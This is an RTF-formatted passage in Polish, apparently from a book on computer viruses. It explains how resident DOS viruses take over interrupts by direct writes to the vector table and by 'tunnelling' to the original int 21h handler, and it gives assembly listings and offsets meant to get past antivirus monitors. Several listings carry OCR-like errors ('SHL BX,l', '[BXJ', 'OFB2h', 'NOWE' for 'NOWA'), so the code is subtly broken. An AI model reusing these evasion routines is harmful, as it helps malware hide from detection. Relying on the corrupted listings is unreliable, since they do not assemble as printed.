\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; Przejmowanie przerwa\uc1\u324\'f1 za pomoce DOS-a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV  AL, NUMER            ; podaj w AL numer przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV  AH, 35h              ; w AH numer funkcji, we\uc1\u378\'9f adres starej procedury               }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; obs\uc1\u322\'b3ugi przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT   21h                 ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS po wywo\uc1\u322\'b3aniu funkcji }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   [StarySEG],ES       ; w ES:BX pobrany adres poprzedniej procedury }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   [StaryOFS],BX       ; obs\uc1\u322\'b3ugi, kt\'f3ry najcz\uc1\u281\'ea\uc1\u347\'9cciej zapami\uc1\u281\'eatuje si\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV  AH, 25h              ; w AH numer funkcji, ustaw now\uc1\u261\'b9 procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   AL,NUMER            ; w AL numer przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   DS, SEG Nowa        ; DS:DX zawiera adres do nowej procedury }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   DX, OFFSET Nowa     ; obs\uc1\u322\'b3ugi przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT   21h                 ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszy spos\'f3b przejmowania przerwa\uc1\u324\'f1, zalecany przez tw\'f3rc\'f3w systemu DOS, ze wzgl\uc1\u281\'eadu na mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 monitorowania funkcji (25/35/21) przez program antywirusowy, stosuj\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej prymitywne wirusy. Bardziej wyrafinowane, u\uc1\u380\'bfywaj\uc1\u261\'b9 metod troch\uc1\u281\'ea innych, om\'f3wionych poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.3. Bezpo\uc1\u347\'9crednie zmiany w tablicy wektor\'f3w przerwa\uc1\u324\'f1}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bezpieczniejszym (ze wzgl\uc1\u281\'eadu na programy antywirusowe) sposobem na przej\uc1\u281\'eacie przerwania jest bezpo\uc1\u347\'9crednia manipulacja w tablicy wektor\'f3w przerwa\uc1\u324\'f1, przy u\uc1\u380\'bfyciu poni\uc1\u380\'bfszej sekwencji w asemblerze, wykonuj\uc1\u261\'b9cej w przybli\uc1\u380\'bfeniu to samo, co sekwencja z poprzedniego punktu:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch : Przejmowanie przerwa\uc1\u324\'f1 bezpo\uc1\u347\'9crednio w tablicy przerwa\uc1\u324\'f1 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   BL, NUMER               ; w BL numer zmienianego przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR   BH,BH                   ; BX=BL }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SHL   BX,l                    ; pomn\'f3\uc1\u380\'bf je przez 4 (2 razy przesu\uc1\u324\'f1 w lewo) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SHL   BX,l                    ; jeszcze raz przesu\uc1\u324\'f1 w lewo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR   AX,AX                   ; zeruj rejestr AX }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   DS,AX                   ;  i z jego pomoc\uc1\u261\'b9 zeruj rejestr segmentu DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab                  ; DS:BX wskazuje na pozycj\uc1\u281\'ea w tablicy przerwa\uc1\u324\'f1, }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                               ; gdzie zapisany jest adres obs\uc1\u322\'b3ugi przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LDS DX,DS:[BX]                ; pobierz segment i offset przerwania (do }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                               ; zapami\uc1\u281\'eatania)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [StarySEG],DS             ; zachowaj segment}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [StaryOFS],DX             ; zachowaj offset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS,AX                     ; ponownie DS=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLI                           ; bezpiecznie zmienia\uc1\u263\'e6 adres obs\uc1\u322\'b3ugi przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                               ; przy wy\uc1\u322\'b3\uc1\u261\'b9czonych przerwaniach }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS:[BXJ,OFFSET NOWA       ; bezpo\uc1\u347\'9crednie warto\uc1\u347\'9cci wskazuj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                               ; na adres nowej }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS:[BX+2], SEG NOWE       ; procedury obs\uc1\u322\'b3ugi przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STI                           ; teraz mo\uc1\u380\'bfna ju\uc1\u380\'bf w\uc1\u322\'b3\uc1\u261\'b9czy\uc1\u263\'e6 przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Oczywi\uc1\u347\'9ccie, w powy\uc1\u380\'bfszej sekwencji mo\uc1\u380\'bfna pomin\uc1\u261\'b9\uc1\u263\'e6 rejestr BX i poda\uc1\u263\'e6 offset w postaci absolutnej (np, jako 21h*4), jednak u\uc1\u380\'bfycie rejestru umo\uc1\u380\'bfliwia przejmowanie wi\uc1\u281\'eacej ni\uc1\u380\'bf jednego przerwania za pomoc\uc1\u261\'b9 tej samej procedury (nale\uc1\u380\'bfy zmienia\uc1\u263\'e6 tylko warto\uc1\u347\'9c\uc1\u263\'e6 BL).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4. W\uc1\u322\'b3\uc1\u261\'b9czanie si\uc1\u281\'ea do istniej\uc1\u261\'b9cego \uc1\u322\'b3a\uc1\u324\'f1cucha obs\uc1\u322\'b3ugi przerwania i znajdowanie czystych wej\uc1\u347\'9c\uc1\u263\'e6 do systemu (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}tunnelling}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dowolna modyfikacja w tablicy przerwa\uc1\u324\'f1 jest \uc1\u322\'b3atwa do wykrycia przez najprymitywniejszy nawet program antywirusowy, st\uc1\u261\'b9d te\uc1\u380\'bf tw\'f3rcy wirus\'f3w poszukiwali innej metody przejmowania przerwa\uc1\u324\'f1, dzi\uc1\u281\'eaki kt\'f3rej nie trzeba modyfikowa\uc1\u263\'e6 tablicy przerwa\uc1\u324\'f1. Opracowano szereg metod polegaj\uc1\u261\'b9cych na w\uc1\u322\'b3\uc1\u261\'b9czaniu si\uc1\u281\'ea do istniej\uc1\u261\'b9cego \uc1\u322\'b3a\uc1\u324\'f1cucha procedur obs\uc1\u322\'b3ugi przerwania, zwanych og\'f3lnie tunelingiem.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zainstalowany rezydentnie w pami\uc1\u281\'eaci wirus musi mie\uc1\u263\'e6 mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 wywo\uc1\u322\'b3ywania pierwotnej procedury przej\uc1\u281\'eatego przez siebie przerwania (np. podczas infekcji potrzebne s\uc1\u261\'b9 funkcje systemu obs\uc1\u322\'b3uguj\uc1\u261\'b9ce dzia\uc1\u322\'b3ania na plikach). Wywo\uc1\u322\'b3ywanie aktualnej (tzn. wskazywanej przez tablic\uc1\u281\'ea przerwa\uc1\u324\'f1) procedury obs\uc1\u322\'b3uguj\uc1\u261\'b9cej dane przerwanie lub nawet tej, kt\'f3ra zosta\uc1\u322\'b3a za}{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}ami\uc1\u281\'eatana podczas instalacji wirusa w pami\uc1\u281\'eaci, grozi szybkim wykryciem przez monitor antywirusowy Najlepiej, gdy wywo\uc1\u322\'b3ywana przez wirusa procedura jest ostatnim elementem w \uc1\u322\'b3a\uc1\u324\'f1cuchu procedur obs\uc1\u322\'b3ugi przerwania, czyli jest to po prostu oryginalna procedura }{\f1\fs24\lang1045{\*\listtag0}zawarta w BIOS-ie lub DOS-ie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.1. Korzystanie ze sta\uc1\u322\'b3ych adres\'f3w w systemie (przerwania 21h i 2Fh)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ta metoda tunelingu jest mo\uc1\u380\'bfliwa tylko w wersjach DOS powy\uc1\u380\'bfej 5.00. S\uc1\u322\'b3u\uc1\u380\'bfy ona do przechwytywania obs\uc1\u322\'b3ugi przerwania 21h i ewentualnie 2Fh (przy okazji znajdowany jest oryginalny adres procedury obs\uc1\u322\'b3ugi tego przerwania, ulokowanej w kodzie systemu DOS). Wykorzystuje ona fakt, i\uc1\u380\'bf system DOS posiada w swym pierwszym bloku MCB (oznaczonym jako systemowy) standardow\uc1\u261\'b9 sekwencj\uc1\u281\'ea kodu (tak\uc1\u261\'b9 sam\uc1\u261\'b9 dla obu przerwa\uc1\u324\'f1 2}{\f1\fs24\lang1045{\*\listtag0}1}{\f0\fs24\lang1045{\*\listtag0}h i 2Fh), kt\'f3ra zosta\uc1\u322\'b3a przedstawiona poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Sekwencja kodu wyst\uc1\u281\'eapuj\uc1\u261\'b9ca w DOS od 5.0 wzwy\uc1\u380\'bf}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.5279in/3.0606in/; table-sdh:8961138}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5024\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}DOS u\uc1\u380\'bfywa HMA}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}DOS nie u\uc1\u380\'bfywa HMA}\cell{\*\abiendcell}\row}{\*\abiendtable}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.0126in/1.2376in/1.2376in/1.5203in/1.5203in/; table-sdh:8979ff8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx3184\clvertalt\cltxlrtb    \cellx4966\clvertalt\cltxlrtb    \cellx7156\clvertalt\cltxlrtb    \cellx9345
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Znaczenie}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod }\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Znaczenie}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx3184\clvertalt\cltxlrtb    \cellx4966\clvertalt\cltxlrtb    \cellx7156\clvertalt\cltxlrtb    \cellx9345
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SEG:OFS}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}90 90}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}NOP NOP}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EB 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}JMP $+3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx3184\clvertalt\cltxlrtb    \cellx4966\clvertalt\cltxlrtb    \cellx7156\clvertalt\cltxlrtb    \cellx9345
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SEG:OFS+2}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 xxxx}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL [IP+xxxx]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 xxxx}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL [IP+xxxx]}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1402\clvertalt\cltxlrtb    \cellx3184\clvertalt\cltxlrtb    \cellx4966\clvertalt\cltxlrtb    \cellx7156\clvertalt\cltxlrtb    \cellx9345
\pard\plain\ltrpar\ql\intbl\itap1{\f3\fs20\lang1045{\*\listtag0} }{\f1\fs24\lang1045{\*\listtag0}SEG:OFS+5}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2E FF 2E yyyy}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}JMP FAR CS:[yyyy]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2E FF 2E}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}JMP FAR CS:[yyyy]}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla przerwania 21h powy\uc1\u380\'bfsza sekwencja kodu wyst\uc1\u281\'eapuje pod adresem SEG:OFS, gdzie OFS jest r\'f3wny 109Eh (w wersji DOS od 5.00 do 6,22) lub 0FB2h w wersjach powy\uc1\u380\'bfej 6.22 (np. DOS 7.0, wyst\uc1\u281\'eapuj\uc1\u261\'b9cy z systemem Windows 95).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku przerwania 2Fh OFS jest r\'f3wny: 10C6h (dla DOS 5.00 - 6.22) i 0FDAh (dla wersji 7.00).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Warto\uc1\u347\'9c\uc1\u263\'e6 SEG jest warto\uc1\u347\'9cci\uc1\u261\'b9 zwracan\uc1\u261\'b9 przez funkcj\uc1\u281\'ea 52h w rejestrze ES. Na podstawie powy\uc1\u380\'bfszych danych \uc1\u322\'b3atwo odczyta\uc1\u263\'e6 adres pierwotnego adresu procedury int 21h, korzystaj\uc1\u261\'b9c z nast\uc1\u281\'eapuj\uc1\u261\'b9cej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,30H               ; funkcja - we\uc1\u378\'9f wersj\uc1\u281\'ea systemu }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XCHG AL,AH               ; zabieg kosmetyczny - aby p\'f3\uc1\u378\'9fniejsze \tab \tab                       }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; por\'f3wnanie by\uc1\u322\'b3o bardziej przejrzyste }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,109EH             ; offset dla wersji 5.00 - 6.22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,0500h             ; czy wersja }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JB NIEDZIA\uc1\u321\'a3A             ; je\uc1\u347\'9cli tak, to tunneling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,0622h             ; czy wersja wi\uc1\u281\'eaksza od 6.22 ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JB Wer5_6_22}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,OFB2h             ; nowsze wersje DOS - inny offset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wer5_6_22:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PUSH BX                  ; zachowaj offset na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,52h               ; funkcja - podaj adres do LL }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP BX                   ; teraz ES:BX wskazuje na sekwencj\uc1\u281\'ea z tabeli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP WORD PTR ES:[BX],9090h; czy jedna z sekwencji ? }{\f2\fs24\lang1045{\*\listtag0}\par}
